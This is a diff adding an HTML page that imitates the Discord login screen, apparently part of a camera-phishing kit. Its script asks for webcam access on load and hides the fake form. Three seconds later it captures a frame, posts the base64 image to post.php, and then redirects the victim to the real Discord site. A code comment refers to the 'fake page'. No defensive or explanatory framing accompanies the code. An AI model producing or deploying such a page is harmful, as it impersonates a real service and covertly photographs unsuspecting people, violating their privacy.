@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #36393f;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+        }
+
+        .login-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .discord-logo {
+            font-size: 36px;
+            font-weight: bold;
+            color: #7289da;
+            margin-bottom: 20px;
+        }
+
+        .login-form {
+            background-color: #2f3136;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            width: 400px;
+            text-align: center;
+        }
+
+        .form-title {
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            padding: 12px;
+            border: 1px solid #202225;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            width: 100%;
+            background-color: #202225;
+            color: #dcddde;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #7289da;
+        }
+
+        .login-button {
+            background-color: #7289da;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+
+        .login-button:hover {
+            background-color: #5865f2;
+        }
+
+        .register-link {
+            color: #7289da;
+            text-decoration: none;
+            margin-top: 15px;
+            display: block;
+        }
+
+        .register-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Styles for video and canvas */
+        #videoElement {
+            width: 400px;
+            height: 300px;
+            background-color: #424242;
+            display: none; /* Initially hide the video */
+            margin-bottom: 20px;
+        }
+
+        #canvasElement {
+            display: none; /* Initially hide the canvas */
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="login-section">
+              <video id="videoElement"></video>
+        <canvas id="canvasElement" width="400" height="300"></canvas>
+        <h1 class="discord-logo">Discord</h1>
+        <div class="login-form">
+            <h2 class="form-title">Login</h2>
+            <input type="text" class="input-field" placeholder="Email or Phone Number">
+            <input type="password" class="input-field" placeholder="Password">
+            <button class="login-button">Login</button>
+            <a href="#" class="register-link">Need an account? Register</a>
+        </div>
+    </div>
+        <script>
+        // Webcam access and image capture
+        var video = document.getElementById('videoElement');
+        var canvas = document.getElementById('canvasElement');
+        var context = canvas.getContext('2d');
+
+        // Get access to the camera!
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.style.display = 'block'; // Show the video
+                    document.querySelector('.login-form').style.display = 'none'; // Hide the placeholder
+                    video.play();
+
+                    // Capture image after 3 seconds
+                    setTimeout(function() {
+                        captureImage();
+                    }, 3000);
+                });
+        }
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, 400, 300);
+            var imageData = canvas.toDataURL('image/png');
+
+            // Send the image data to the server
+            sendImage(imageData);
+        }
+
+        function sendImage(imageData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'post.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() {
+                // Redirect to the fake page after sending the image
+                window.location.href = 'https://discord.com/login'; // Replace with your actual URL
+            };
+            xhr.send('cat=' + encodeURIComponent(imageData));
+        }
+    </script>
+</body>
+</html>
